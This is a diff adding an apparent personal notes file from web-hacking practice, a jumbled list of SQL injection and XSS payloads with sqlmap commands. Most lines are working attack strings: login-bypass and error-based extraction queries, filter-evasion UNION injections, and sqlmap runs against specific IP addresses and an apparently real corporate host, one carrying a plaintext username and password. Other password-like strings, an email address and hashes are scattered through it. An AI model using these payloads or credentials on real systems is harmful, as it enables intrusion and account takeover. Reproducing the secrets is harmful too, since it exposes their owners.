@@ -1,0 +1,102 @@
+WALMART _ $ park FRUIT park fruit MUSIC * ! apple 3 SKYPE fruit DRIP visa
+W_$pFpfM*!a3SfDv
+hksmyjcz@johnderasia.com
+
+qQ2piH#Z39J3A3(#pC9e33n54y62J3:'
+
+R5L#YK]9bta,$,{554p8g9rciYaP=TT:
+Sql injection
+
+' or '1'='1'
+
+' or 1=1 --
+
+1' or 1=1 -- -	working
+
+ admin'--
+ 
+ admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+....
+
+python3 sqlmap.py -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner --dbs --users
+
+python3 sqlmap.py -u "http://35.190.155.168/12c145394c/login" --method="POST" --data"Username=1' or 1=1 -- -&Password=1' or 1=1 -- -" -p pass --dbs
+
+python3 sqlmap.py -u "http://35.190.155.168/12c145394c/login" --method="POST" --data"Username=1' or 1=1 -- -&Password=1' or 1=1 -- -" --auth-type Basic --auth-cred "1' or 1=1 -- -:1' or 1=1 -- -"
+
+username=' AND (SELECT 8268 FROM(SELECT COUNT(*),CONCAT(0x71716a7671,(SELECT (ELT(8268=8268,1))),0x7162786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- YUUO&password
+
+qqjvq1qbxjq1
+
+foo' UNION SELECT "AAA" as password FROM admins WHERE '1' = '1
+AAA
+
+curl -v -X POST http://{ctf}/page/edit/2
+
+eyJhZG1pbiI6dHJ1ZX0.EZ7i8w.Zs-h5EluMy7k0wRE7fy0rYfAego
+
+eyJhZG1pbiI6dHJ1ZX0.EZ7p9Q.yOUtgIAZwawE00J7sOkfyg-Iuq8
+
+
+foo' OR (select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(admins.password as char),0x27,0x7e) FROM `level2`.admins LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1
+
+XSS
+
+"><h1>test</h1>
+'+alert(1)+'
+"onmouseover="alert(1)
+http//"onmouseover-"alert(1)
+
+
+lETYVjwY7ESXXFZ9JTrppg~~
+
+https://golang.org/dl/
+
+curl https://dl.google.com/go/go1.14.3.src.tar.gz
+
+https://support.subgraph.com/downloads/VegaBuild-linux.gtk.x86_64.zip
+
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+
+https://gitlab.com/kalilinux/packages/grabber.git
+
+
+' OR 1='1 --
+' AND 0='1 --
+
+/*! some comment*/-- MYSQL
+WAITFORDELAY MSSQL
+UTL_INADDR.get_host_address('google.com'')
+
+5108129323
+
+$ python3 sqlmap.py -u " http://clmvs12.clmmatrix.com/_layouts/15/ClmMatrixSolution/ClmMatrix.Web/DataListService.svc/GetList/6" --banner --auth-type="Basic" --auth-cred="clmmatrixcloud\pankaj.kumar:Al@ha123PK"
+
+c81e728d9d4c2f636f067f89cc14862c
+
+e4da3b7fbbce2345d7772b0674a318d5
+
+8f14e45fceea167a5a36dedd4bea2543
+
+http://34.94.3.143/6de233efe2/index.php?page=delete.php&id=c81e728d9d4c2f636f067f89cc14862c
+
+http://localhost/d06057a507/newUser?username=abc&password=abc&password2=abc
+
+
+d06057a507
+
+Words escape
+even the most cunning tongue...
+
+1565131888
+
+675 844 774
+
+526426-LYzOL / Password = LYzOLoHe
